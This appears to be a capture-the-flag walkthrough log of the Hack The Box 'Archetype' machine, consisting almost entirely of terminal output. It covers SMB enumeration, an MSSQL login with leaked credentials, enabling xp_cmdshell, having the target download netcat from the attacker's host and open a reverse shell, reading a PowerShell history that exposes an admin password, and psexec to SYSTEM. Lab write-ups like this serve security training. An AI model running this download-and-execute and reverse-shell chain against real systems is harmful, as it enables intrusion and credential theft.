# Archetype

## **Thu Mar 20 1:38 PM**

```bash
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ sudo nmap -sC -sV -p- -T4 10.129.155.160
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 11:18 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 11.42% done; ETC: 11:19 (0:00:31 remaining)
Nmap scan report for 10.129.155.160
Host is up (0.041s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.155.160:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-20T15:14:43
|_Not valid after:  2055-03-20T15:14:43
| ms-sql-ntlm-info: 
|   10.129.155.160:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-03-20T15:20:16+00:00; +1s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-20T15:20:08
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-20T08:20:10-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.09 seconds

┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ smbclient -N -L 10.129.155.160                                                                

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.155.160 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ smbclient -N \\\\10.129.155.160\\backups                                                      
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2540130 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~]
└─$ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.155.160 -windows-auth                     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands

SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> reconfigure
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
archetype\sql_svc   

NULL                

SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"

SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"

──(kali㉿kali)-[~]
└─$ psexec.py administrator@10.129.155.160                                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.155.160.....
[*] Found writable share ADMIN$
[*] Uploading file rbjgxTnu.exe
[*] Opening SVCManager on 10.129.155.160.....
[*] Creating service WBEv on 10.129.155.160.....
[*] Starting service WBEv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,711,543,808 bytes free

C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
C:\Users\Administrator\Desktop> 

```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.155.160 - - [20/Mar/2025 13:19:15] "GET /nc64.exe HTTP/1.1" 200 -
10.129.155.160 - - [20/Mar/2025 13:28:35] "GET /winPEASx64.exe HTTP/1.1" 200 -

```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.155.160] 49677
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc\Desktop> type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
PS C:\Users\sql_svc\Desktop> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
PS C:\Users\sql_svc\Desktop> 

```

PWN：[https://www.hackthebox.com/achievement/machine/2077152/287](https://www.hackthebox.com/achievement/machine/2077152/287)